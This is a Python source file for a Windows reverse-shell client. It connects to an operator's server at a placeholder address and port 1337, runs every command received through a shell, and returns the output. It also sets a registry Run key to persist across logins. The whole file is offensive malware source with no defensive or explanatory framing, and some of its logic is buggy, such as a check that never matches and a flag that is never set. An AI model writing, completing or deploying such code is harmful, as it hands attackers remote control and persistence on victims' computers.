import os
import socket
import subprocess
import time
import winreg

regKeySet = False

# Create a socket
def createSocket():
    try:
        global host
        global port
        global s
        host = '127.0.0.1' #insert IPv4 to server
        port = 1337
        s = socket.socket()
    except socket.error as msg:
        #print("Socket creation error: " + str(msg))
        pass

# Connect to a remote socket
def connSocket():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        #print("Socket connection error: " + str(msg))
        pass

# Receive commands from remote server and run on local machine
def recCmd():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("UTF-8") == 'shell':
            shellcmd = os.environ['SHELL']
            s.send(str.encode(shellcmd))
        if len(data) == 0:
            time.sleep(5)
            main()
        if len(data) > 0:
            output = None
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output = str(output_bytes, "utf-8")
            except Exception as err:
                output = "Command exec failed: %s\n" % str(err)
            if output is not None:
                try:
                    s.send(str.encode(output))
                    #print(output)
                except Exception as err:
                    output = "Command send failure: %s\n" % str(err)
    s.close()

# Set registry runkey for client PE, establish persistence
def set_run_key(key, value):
    """
    Set/Remove Run Key in windows registry.

    :param key: Run Key Name
    :param value: Program to Run
    :return: None
    """
    # This is for the system run variable
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winreg.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)
            regKeySet = True

def main():
    createSocket()
    connSocket()
    recCmd()
    if not regKeySet:
        set_run_key('poopKeyName', '%windir%\system32\cmd.exe')

while 1:
    main()
